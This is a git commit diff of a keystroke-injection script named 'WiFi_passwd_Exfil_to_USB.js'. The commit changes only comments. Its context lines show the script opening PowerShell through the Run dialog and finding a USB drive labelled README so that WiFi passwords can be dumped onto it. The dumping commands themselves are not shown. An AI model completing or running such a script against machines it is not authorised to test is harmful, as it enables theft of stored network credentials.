7119d138f304e01d08bdb7ea6eb29186311a3104
dxD7 <40486657+dxD7@users.noreply.github.com>
2022-02-05 20:15:05 -0500

    Update WiFi_passwd_Exfil_to_USB.js

--- WiFi_passwd_Exfil_to_USB.js
+++ WiFi_passwd_Exfil_to_USB.js
@@ -2,7 +2,7 @@
 // Standard dump wifi keys, adapted for slow speed laptops.
 
 // Note you need to make a USB Mass storage device for this,
-// Mine is called 'README', but you can change it in the code below.
+// Mine is called README, but you can change it in the code below.
 
   
 layout('us') 
@@ -10,7 +10,7 @@ press("GUI r")
 delay(500)
 type("powershell\n") 
 delay(600)
-type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name \n") // Swap RECOVERY with drive name 
+type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'README' } | select name \n") // Swap README with drive name 
 delay(500)
 type("cd $usbpath.name\n")
 delay(500)
